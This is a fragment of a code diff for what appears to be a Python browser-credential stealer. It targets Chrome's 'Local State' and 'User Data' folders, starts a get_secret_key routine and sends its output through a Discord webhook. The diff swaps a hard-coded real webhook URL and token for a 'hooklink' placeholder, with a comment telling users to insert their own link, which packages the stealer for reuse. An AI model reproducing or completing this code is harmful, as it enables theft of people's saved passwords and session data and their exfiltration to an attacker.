@@ -19,12 +19,12 @@ def main():
     import random
     import ctypes
 
-    #GLOBAL CONSTANT
     CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
     CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
-    hook = Webhook("https://discord.com/api/webhooks/997823160709824563/BZrQFP7XES-1fN8gomiKGAM3t1Lr6Jo4NVB3OivghoqY9COV6IrkQHSwfnuffobmiTVn")
+    
+    #CHANGE "HOOKLINK" TO YOUR DISCORD LINK HOOK
+    hook = Webhook("hooklink")
     pc = socket.gethostname()
-    path = r"C:\Users\Admin\AppData\Roaming\.minecraft"
 
     def get_secret_key():
         try:
